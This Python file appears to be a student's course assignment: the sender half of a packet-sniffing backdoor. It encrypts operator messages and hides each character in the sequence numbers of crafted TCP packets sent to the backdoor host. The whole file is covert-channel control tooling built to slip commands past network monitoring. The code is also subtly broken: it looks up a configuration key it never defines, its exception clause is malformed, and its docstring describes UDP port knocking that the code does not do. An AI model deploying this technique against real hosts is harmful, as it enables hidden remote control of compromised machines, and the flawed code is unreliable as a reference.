#!/usr/bin/env python3

"""
----------------------------------------------------------------------------------------------------
COMP 8505 BTech Network Security & Applications Development
Assignment 3:
    - To become familiar with packet sniffing backdoors and to implement Linux backdoors.
Student:
    - Hung Yu (Angus) Lin, A01034410, Set 7J
----------------------------------------------------------------------------------------------------
sender.py
    - Contains sender command line UI send a command hidden in UDP port knocking to receiver backdoor,
      then decrypts the data returned from backdoor and display to user.
----------------------------------------------------------------------------------------------------
"""

from _thread import *
from scapy.all import *
from scapy.layers.inet import *
import encryption

LOG_PATH = "log.txt"
CONFIGURATION_PATH = "configuration.txt"


def read_configuration():
    """
    Reads configuration file.
    :return: list (config vars)
    """

    configuration = {
        'receiver_address': '',
        'sender_address': '',
        'receiver_port1': 0,
        'receiver_port2': 0,
        'receiver_port3': 0,
        'sender_port': 0,
    }

    with open(file=CONFIGURATION_PATH, mode='r', encoding='utf-8') as file:
        fp = [line.rstrip('\n') for line in file]
        for line in fp:
            if line.isspace() or line.startswith('#'):
                continue

            config_data = line.split('=')
            if config_data[0] in configuration:
                if config_data[0] in ('receiver_address', 'sender_address'):
                    configuration[config_data[0]] = config_data[1]
                elif config_data[0] in ('receiver_port1', 'receiver_port2', 'receiver_port3', 'sender_port'):
                    data = config_data[1]
                    if data.isdigit():
                        configuration[config_data[0]] = int(config_data[1])
                    else:
                        print("Invalid configuration, ports must be integers.")
                        exit()
                else:
                    print("Invalid configuration, unsupported variable detected.")
                    exit()

    return configuration


def start_sender():
    print("Starting Sender. (Type \"exit\" to shutdown)")
    configuration = read_configuration()
    address = configuration['receiver_address']
    port = configuration['receiver_port']
    encryption.generate_key()

    keep_going = True
    while keep_going:
        user_input = input("Type a message and press enter to send: ")
        if user_input == "exit":
            print("Sender Shutdown.")
            break

        try:
            encoded_input = user_input.encode("ascii").decode("ascii")
        except UnicodeEncodeError or UnicodeDecodeError:
            print("Invalid character detected. Must be ASCII supported values only.")
            continue

        send_message(user_input, address, port)


def send_message(message, address, port):

    dst = address
    sport = 7000
    dport = port
    inital_seq_num = 1000

    # 3-way-handshake
    ip = IP(dst=dst)  # ip = IP(dst=dst, frag=0)
    tcp_syn = ip / TCP(sport=sport, dport=dport, flags='S', seq=inital_seq_num)
    tcp_synack = sr1(tcp_syn, verbose=0, timeout=5)

    if tcp_synack is None:
        print("3-way-handshake failed. No response from receiver.")
        return
    tcp_ack = ip / TCP(sport=sport, dport=dport, flags='A', seq=tcp_synack.ack, ack=tcp_synack.seq + 1)
    send(tcp_ack, verbose=0)

    # Starting to send data.
    cur_seq = tcp_synack.ack
    cur_ack = tcp_synack.seq + 1

    data = encryption.encrypt(message.encode("ascii")).decode("ascii")
    # data = message
    current_seq = 1000
    for c in data:
        if current_seq > 2000000000:
            current_seq = 0
        current_seq += 1000
        stega_seq = current_seq + ord(c)

        tcp_pushack = ip / TCP(sport=sport, dport=dport, flags='PA', seq=stega_seq, ack=cur_ack)
        send(tcp_pushack, verbose=0)
        cur_seq = stega_seq
        # cur_ack = tcp_ack.seq
        # cur_seq += len(data)
        # RESPONSE = sr1(ip / PUSHACK / Raw(load=data))

    # Closing TCP connection
    # start_new_thread(wait_for_fin_ack, (address, ip, sport, dport))
    tcp_fin = ip / TCP(sport=sport, dport=dport, flags="FA", seq=cur_seq, ack=cur_ack)
    # tcp_finack = sr1(tcp_fin)
    send(tcp_fin, verbose=0)
    # tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=tcp_finack.ack, ack=tcp_finack.seq + 1)
    tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=cur_seq, ack=cur_ack + 1)
    send(tcp_lastack, verbose=0)
    print("Send Complete.")


# def wait_for_fin_ack(address, ip, sport, dport):
#     print("sniffing")
#     # tcp_finack = sniff(filter=f"host {address} and tcp-fin != 0", count=1)
#     tcp_finack = sniff(filter=f"host {address} and tcp-fin != 0", count=1)
#     print("sniffed!")
#     print(tcp_finack)
#     ack = tcp_finack[0].payload.payload.ack
#     seq = tcp_finack[0].payload.payload.seq
#     print(f"ack {ack}")
#     print(f"seq {seq}")
#     tcp_lastack = ip / TCP(sport=sport, dport=dport, flags="A", seq=ack, ack=seq + 1)
#     send(tcp_lastack)

    # IPv4 Socket connection to receiver.
    # with socket(AF_INET, SOCK_STREAM) as sock:
    #     sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    #     sock.connect((address, port))
    #     sock.sendall(message.encode("utf-8"))
    #     print(f"Receiver: \tIP = {address}, Port = {port}")
    #     print(f"Message Sent: \t{message}")


if __name__ == "__main__":
    try:
        start_sender()
    except KeyboardInterrupt as e:
        print("Sender Shutdown")
        exit()


